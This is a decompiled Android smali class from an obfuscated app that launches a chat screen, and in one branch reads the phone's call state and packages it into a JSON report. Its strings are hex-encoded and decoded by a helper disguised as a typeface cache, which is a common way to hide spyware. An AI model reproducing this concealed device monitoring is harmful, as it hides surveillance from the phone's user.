.class public final synthetic Lv/s/m7Tosu6RfY5Ca6;
.super Ljava/lang/Object;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic JXn4Qf7zpnLjP5:Ljava/lang/String;

.field public final synthetic vekpFI4d1Nc4fakF:Lv/s/RWY6BVSB0XxPbw;

.field public final synthetic w9sT1Swbhx3hs:I


# direct methods
.method public synthetic constructor <init>(Lv/s/RWY6BVSB0XxPbw;Ljava/lang/String;I)V
    .locals 0

    .line 1
    iput p3, p0, Lv/s/m7Tosu6RfY5Ca6;->w9sT1Swbhx3hs:I

    .line 2
    .line 3
    iput-object p1, p0, Lv/s/m7Tosu6RfY5Ca6;->vekpFI4d1Nc4fakF:Lv/s/RWY6BVSB0XxPbw;

    .line 4
    .line 5
    iput-object p2, p0, Lv/s/m7Tosu6RfY5Ca6;->JXn4Qf7zpnLjP5:Ljava/lang/String;

    .line 6
    .line 7
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 8
    .line 9
    .line 10
    return-void
.end method


# virtual methods
.method public final run()V
    .locals 7

    .line 1
    iget v0, p0, Lv/s/m7Tosu6RfY5Ca6;->w9sT1Swbhx3hs:I

    .line 2
    .line 3
    packed-switch v0, :pswitch_data_0

    .line 4
    .line 5
    .line 6
    iget-object v0, p0, Lv/s/m7Tosu6RfY5Ca6;->vekpFI4d1Nc4fakF:Lv/s/RWY6BVSB0XxPbw;

    .line 7
    .line 8
    iget-object v1, p0, Lv/s/m7Tosu6RfY5Ca6;->JXn4Qf7zpnLjP5:Ljava/lang/String;

    .line 9
    .line 10
    :try_start_0
    iget-object v0, v0, Lv/s/RWY6BVSB0XxPbw;->vekpFI4d1Nc4fakF:Lv/s/J1m0XraSkScfWFMIlTC;

    .line 11
    .line 12
    if-eqz v0, :cond_0

    .line 13
    .line 14
    invoke-virtual {v0, v1}, Lv/s/J1m0XraSkScfWFMIlTC;->b1EoSIRjJHO5(Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 15
    .line 16
    .line 17
    goto/16 :goto_0

    .line 18
    :catch_0
    move-exception v0

    .line 19
    const-string v1, "001000730055008300B000BA00C000B5002C0064001B00CF00FF00B900D400AB002C0077005F008200F400F6008800E7"

    .line 20
    .line 21
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 22
    .line 23
    .line 24
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 25
    .line 26
    .line 27
    :cond_0
    :goto_0
    return-void

    nop

    nop

    .line 28
    :pswitch_0
    iget-object v0, p0, Lv/s/m7Tosu6RfY5Ca6;->JXn4Qf7zpnLjP5:Ljava/lang/String;

    .line 29
    .line 30
    iget-object v1, p0, Lv/s/m7Tosu6RfY5Ca6;->vekpFI4d1Nc4fakF:Lv/s/RWY6BVSB0XxPbw;

    .line 31
    .line 32
    iget-object v1, v1, Lv/s/RWY6BVSB0XxPbw;->dDIMxZXP1V8HdM:Landroid/content/Context;

    .line 33
    .line 34
    :try_start_1
    new-instance v2, Landroid/content/Intent;

    .line 35
    .line 36
    const-class v3, Lapp/mobilex/plus/ChatActivity;

    .line 37
    .line 38
    invoke-direct {v2, v1, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 39
    .line 40
    .line 41
    const/high16 v3, 0x10000000

    .line 42
    .line 43
    invoke-virtual {v2, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 44
    .line 45
    .line 46
    const-string v3, "002E00730048009400F100B800D7"

    .line 47
    .line 48
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 49
    .line 50
    .line 51
    move-result-object v3

    .line 52
    invoke-virtual {v2, v3, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 53
    .line 54
    .line 55
    invoke-virtual {v1, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 56
    .line 57
    .line 58
    goto/16 :goto_1

    .line 59
    :catch_1
    move-exception v0

    .line 60
    const-string v1, "000500770052008B00F500BB009200B3002C00360054009700F500B100920084002B0077004F00A600F300AB00DB00B1002A0062004200DD00B0"

    .line 61
    .line 62
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 63
    .line 64
    .line 65
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 66
    .line 67
    .line 68
    :goto_1
    return-void

    .line 69
    :pswitch_1
    iget-object v0, p0, Lv/s/m7Tosu6RfY5Ca6;->vekpFI4d1Nc4fakF:Lv/s/RWY6BVSB0XxPbw;

    .line 70
    .line 71
    iget-object v1, p0, Lv/s/m7Tosu6RfY5Ca6;->JXn4Qf7zpnLjP5:Ljava/lang/String;

    .line 72
    .line 73
    const-wide/16 v2, 0xbb8

    .line 74
    .line 75
    :try_start_2
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    .line 76
    .line 77
    .line 78
    iget-object v2, v0, Lv/s/RWY6BVSB0XxPbw;->dDIMxZXP1V8HdM:Landroid/content/Context;

    .line 79
    .line 80
    const-string v3, "phone"

    .line 81
    .line 82
    invoke-virtual {v2, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 83
    .line 84
    .line 85
    move-result-object v2

    .line 86
    instance-of v3, v2, Landroid/telephony/TelephonyManager;

    .line 87
    .line 88
    if-eqz v3, :cond_1

    .line 89
    .line 90
    check-cast v2, Landroid/telephony/TelephonyManager;

    .line 91
    .line 92
    goto :goto_2

    .line 93
    :cond_1
    const/4 v2, 0x0

    .line 94
    :goto_2
    const/16 v3, 0x0

    .line 95
    if-eqz v2, :cond_2

    .line 96
    .line 97
    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getCallState()I

    .line 98
    .line 99
    .line 100
    move-result v2

    .line 101
    goto/16 :goto_3

    .line 102
    :cond_2
    move/from16 v2, v3

    .line 103
    :goto_3
    const/4 v4, 0x2

    nop

    nop

    .line 104
    if-ne v2, v4, :cond_3

    .line 105
    .line 106
    const/4 v3, 0x1

    nop

    .line 107
    :cond_3
    new-instance v4, Lorg/json/JSONObject;

    .line 108
    .line 109
    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    .line 110
    .line 111
    .line 112
    const-string v5, "0037006F004B0082"

    .line 113
    .line 114
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 115
    .line 116
    .line 117
    move-result-object v5

    .line 118
    const-string v6, "002000770057008B00CF00AC00C600A6003700630048"

    .line 119
    .line 120
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 121
    .line 122
    .line 123
    move-result-object v6

    .line 124
    invoke-virtual {v4, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 125
    .line 126
    .line 127
    const-string v5, "002D00630056008500F500AD"

    .line 128
    .line 129
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 130
    .line 131
    .line 132
    move-result-object v5

    .line 133
    invoke-virtual {v4, v5, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 134
    .line 135
    .line 136
    const-string v1, "00220075004F008E00E600BA"

    .line 137
    .line 138
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 139
    .line 140
    .line 141
    move-result-object v1

    .line 142
    invoke-virtual {v4, v1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 143
    .line 144
    .line 145
    const-string v1, "002000770057008B00CF00AC00C600A600370073"

    .line 146
    .line 147
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 148
    .line 149
    .line 150
    move-result-object v1

    .line 151
    invoke-virtual {v4, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 152
    .line 153
    .line 154
    invoke-virtual {v0, v4}, Lv/s/RWY6BVSB0XxPbw;->H9XlUr4OeMJFiXK(Lorg/json/JSONObject;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 155
    .line 156
    .line 157
    :catch_2
    return-void

    .line 158
    :pswitch_2
    iget-object v0, p0, Lv/s/m7Tosu6RfY5Ca6;->vekpFI4d1Nc4fakF:Lv/s/RWY6BVSB0XxPbw;

    .line 159
    .line 160
    iget-boolean v1, v0, Lv/s/RWY6BVSB0XxPbw;->ibVTtJUNfrGYbW:Z

    .line 161
    .line 162
    if-eqz v1, :cond_4

    .line 163
    .line 164
    iget-boolean v1, v0, Lv/s/RWY6BVSB0XxPbw;->xDyLpEZyrcKVe0:Z

    nop

    .line 165
    .line 166
    if-nez v1, :cond_4

    .line 167
    .line 168
    iget-object v1, p0, Lv/s/m7Tosu6RfY5Ca6;->JXn4Qf7zpnLjP5:Ljava/lang/String;

    .line 169
    .line 170
    invoke-virtual {v0, v1}, Lv/s/RWY6BVSB0XxPbw;->ibVTtJUNfrGYbW(Ljava/lang/String;)V

    .line 171
    .line 172
    .line 173
    :cond_4
    return-void

    .line 174
    .line 175
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method
